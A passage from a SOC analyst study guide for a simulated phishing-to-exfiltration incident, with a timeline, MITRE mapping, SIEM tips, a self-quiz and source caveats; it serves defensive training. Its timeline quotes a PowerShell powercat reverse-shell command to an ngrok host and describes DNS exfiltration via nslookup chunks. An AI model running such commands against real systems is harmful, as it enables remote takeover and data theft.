| 14:44:19 | `rundll32.exe` ← `iexplore.exe` runs `ClearMyTracksByProcess` from Michael's Desktop | **Defense evasion:** clearing browser traces. First sign something is wrong. |
| 14:51 | `rdpclip.exe` ← `svchost.exe` (alert 1006) | An RDP session on this host. Source unverified. |
| 14:59:54 | Outlook opens `Important: Pending Invioce!.eml` | Phishing email arrives and is opened. |
| 15:09:57 | Outlook saves `ImportantInvoice-Febrary.zip` to INetCache | User opens the attachment. |
| 15:10:08 | Explorer extracts the ZIP; `invioce.pdf.lnk` appears | Disguised shortcut. |
| 15:10:00 to 15:10:09 | DNS lookups: `raw.githubusercontent.com` → `185.199.111.133`; `2.tcp.ngrok.io` → `3.22.53.161` | Payload download and C2 resolution. (The walkthrough lists the DNS entries at 15:10:00, slightly before the PowerShell event; this is presumably clock granularity.) |
| 15:10:09 | PowerShell: `IEX … powercat -c 2.tcp.ngrok.io -p 19282 -e powershell` | Fileless download and reverse shell. |
| 15:10:12 | "Connection to 2.tcp.ngrok.io:19282 [tcp] succeeded!" | **The attacker is in.** |
| 15:10:25 to 15:10:54 | `systeminfo`, `whoami`, `whoami /priv`, `net user`, `net localgroup` | Discovery: learning about the machine, user, and privileges. |
| 15:11:20 | `PowerView.ps1` created in Downloads by PID 9060 (alert 1020) | AD recon tool downloaded. |
| 15:11:33 | New PowerShell with `-ExecutionPolicy Bypass` (PID 3728) | Bypassing script restrictions. |
| 15:11:41 to 15:12:09 | PowerView runs AD queries | Mapping domain computers and shares. |
| 15:13:15 | `net use Z: \\FILESRV-01\SSF-FinancialRecords` (alert 1022) | Financial share mapped. |
| 15:14:02 | Robocopy from Z: to `...\downloads\exfiltration\` | Files copied locally. |
| 15:14:13 | `net use Z: /delete` (alert 1024) | Covering tracks. |
| 15:14:31 | `exfilt8me.zip` created | Stolen files compressed. |
| 15:15:00 | `nslookup <chunk>.haz4rdw4re.io` repeated (alerts 1025 to 1034) | **DNS exfiltration.** |
| 15:15:25 | Reverse-shell process killed with `Stop-Process` | Attacker disconnects. |

### The attack in plain English

1. The attacker sends Michael a fake overdue-invoice email.
2. Michael opens the ZIP and clicks what looks like a PDF.
3. It secretly gives the attacker a remote command line on his PC.
4. The attacker looks around, then downloads a mapping tool.
5. The attacker finds the financial file share, copies the files, and wipes the evidence of the connection.
6. The attacker smuggles the files out hidden inside DNS lookups.
7. The attacker disconnects cleanly.

---

## 11. MITRE ATT&CK mapping

*MITRE IDs are easy to mix up. Check each one at [https://attack.mitre.org](https://attack.mitre.org/) before using it in a report.*

| Stage | What happened | Technique |
| --- | --- | --- |
| Initial Access | Phishing email with ZIP | T1566.001 Spearphishing Attachment |
| Execution | User clicked the `.lnk` | T1204.002 User Execution: Malicious File |
| Execution | PowerShell command | T1059.001 PowerShell |
| Command and Control | Powercat and PowerView downloaded | T1105 Ingress Tool Transfer |
| Command and Control | Reverse shell through ngrok | T1572 Protocol Tunneling |
| Defense Evasion | `ClearMyTracksByProcess`, `net use /delete` | T1070 Indicator Removal |
| Discovery | `systeminfo` | T1082 System Information Discovery |
| Discovery | `whoami` | T1033 System Owner/User Discovery |
| Discovery | `net user` | T1087 Account Discovery |
| Discovery | `net localgroup` | T1069 Permission Groups Discovery |
| Discovery | PowerView | T1018 Remote System Discovery |
| Discovery | Finding the share | T1135 Network Share Discovery |
| Collection | Robocopy to local folder | T1074 Data Staged |
| Collection | `exfilt8me.zip` | T1560 Archive Collected Data |
| Exfiltration | DNS queries with data | T1048.003 Exfiltration Over Alternative Protocol |
| Exfiltration | Base64 chunks | T1132.001 Data Encoding: Standard Encoding |

---

## 12. SIEM searches that mattered

The walkthrough mentions these searches (syntax differs by SIEM):

| Search | Why |
| --- | --- |
| `host=win-3459` (Splunk-style) | Check all activity on a host to confirm a process alert is benign. |
| `host=win-3450` | See the full attack chain on the compromised workstation. Widen the time window. |
| `host=win-3450 PowerView` | Find when and how PowerView arrived. |
| `host.name="win-3450" FILESRV` (Elastic-style) | Find share access events to the file server. |
| `host=win-3455` | Check the second possible victim. |

### Search habits that work

1. **Pivot on host first.** Search the host named in the alert, over a wide time window.
2. **Then pivot on user.** Search the username in other logs.
3. **Then pivot on indicators.** Search a domain, IP, or filename across all hosts to find other victims.
4. **Read the whole sequence**, not just the one event. Look for what happened just before and just after.
5. **Note the times.** Ordering is how you prove "A led to B".

---

## 13. Lessons the room teaches

1. **Context decides the verdict.** `rdpclip.exe` on a clean host is nothing. On a host with active compromise indicators, it deserves escalation.
2. **Patterns beat single alerts.** The same `.xyz` domain appearing three times means a campaign. The same `ClearMyTracksByProcess` pattern on two hosts means a connected attack.
3. **The SIEM is the investigation; the alert is only a nudge.** Alert 1010 looked benign until the SIEM was searched.
4. **Search before closing.** A false-positive-looking alert can sit on a host where something else is happening.
5. **Multiple alerts can be one event.** Ten High alerts were one DNS exfiltration.
6. **Know your known victims.** Keep a list of compromised hosts and users as you go, so related alerts get linked.
7. **Attackers don't need fancy tools.** Phishing, shortcuts, PowerShell, ngrok, and DNS are all common and simple.
8. **DNS is a blind spot.** Many networks don't monitor it closely, which is why exfiltration over DNS works.
9. **Triage by priority when under pressure.** Handle High first when an incident is unfolding.
10. **The tool is not the skill.** The queries differ across Splunk, Sentinel, and Elastic, but the thinking does not.

---

## 14. Common report mistakes and fixes

| Mistake | Fix |
| --- | --- |
| Missing origin | State where the activity started: sender, parent process, earlier alert. |
| Names missing | Name every host, user, sender, recipient, PID, file, domain. |
| Guesses written as facts ("attacker pivoted to RDP") | Separate observed, inferred, unverified. Check timestamps. |
| "May be compromised" | Either state the evidence that confirms it, or say "indicator consistent with…, unverified". |
| Indicators described, not listed | List exact values: full command lines, IPs, domains, paths. |
| "Normal Windows process" with no proof | Say what you verified: path, parent, command line, host history. |
| Not explaining non-escalations | Write "Not escalated because [what you checked and found]". |
| Calling spam domains "malicious" | Say "spam/scam domain" unless there is malware evidence. |
| Wrong time field | State whether you mean alert time or SIEM event time. |
| Not linking alerts | Write "Part of the incident in alert 1005". |
| Not defanging | `example[.]com`, `hxxp://`. |
| Closing an alert without checking the host | Search the host in the SIEM first. |

---

## 15. Self-quiz

Try to answer before reading the answers below.

1. Why is alert 1004 more informative than alert 1003?
2. Why was `rdpclip.exe` escalated on `win-3450` but closed on `win-3453`?
3. What was the real danger inside `ImportantInvoice-Febrary.zip`?
4. What does `IEX` do in the PowerShell command?
5. Why would an attacker use ngrok?
6. Why did ten High severity alerts fire at once?
7. How do you know the attacker stole data over DNS?
8. Why is "may be compromised" a weak phrase in a report?
9. How do we know `michael.ascot` was compromised when we reach alert 1011?
10. What was suspicious about the alert 1010 host, even though `WUDFHost.exe` is harmless?

### Answers

1. It shows the **same domain** sending to a **different employee**, which confirms a campaign.
2. `win-3450` already had compromise indicators (`ClearMyTracksByProcess`), while `win-3453` had no prior suspicious activity.
3. A **`.lnk` shortcut** (`invioce.pdf.lnk`) disguised as a PDF, which ran PowerShell on click.
4. It runs a string as code, letting the attacker download and execute a script **in memory** without saving it to disk.
5. It tunnels traffic through a legitimate service, so the C2 server's address is hidden and the traffic may look normal.
6. The script ran `nslookup` once per data chunk, and each run triggered the parent-child rule.
7. `nslookup.exe` with base64-looking subdomains of `haz4rdw4re.io`, spawned by PowerShell, with the script reading `exfilt8me.zip` and encoding it.
8. It is vague and unverifiable. State what the evidence confirms, or label it "unverified".
9. From alert 1005 and the SIEM search on `win-3450`: the reverse shell connection **succeeded** at 15:10:12 and discovery commands followed. Precisely, his **workstation** is confirmed compromised.
10. `rundll32.exe` ← `iexplore.exe` running `ClearMyTracksByProcess` from `ashwin.johnston`'s Desktop, matching the first sign on `win-3450`.

---

## 16. Notes on sources and gaps

- This guide is based on a **public walkthrough** of the room (a Medium write-up). I could not access the GitHub repository you also linked, so nothing in this guide comes from it.
- **Alert 1023** is not covered by that walkthrough. By timing it sits between 1022 (06:42:41) and 1024 (06:43:39), and the SIEM shows the Robocopy copy at 15:14:02 in the matching window. That is an **inference**. Open it in the room and verify before writing it up.
- Individual reports for **1025 to 1034** are summarised in the walkthrough, not shown one by one. The guidance in Section 9 is built from the shared pattern and the command line the walkthrough quotes.
- **Alert times** (06:xx) and **SIEM event times** (14:xx to 15:xx) differ in the source and are not explained. Always state which clock you are quoting.
- The walkthrough's text contains some formatting glitches (spaces inside domains). **Copy exact values from your own room instance.**
- Room contents can change between sessions, so treat PIDs, hostnames, and times as examples to compare against what you see.

---

*Keep this file and revisit it after each SOC Simulator room. Compare how your reports answer the five questions in Section 5.*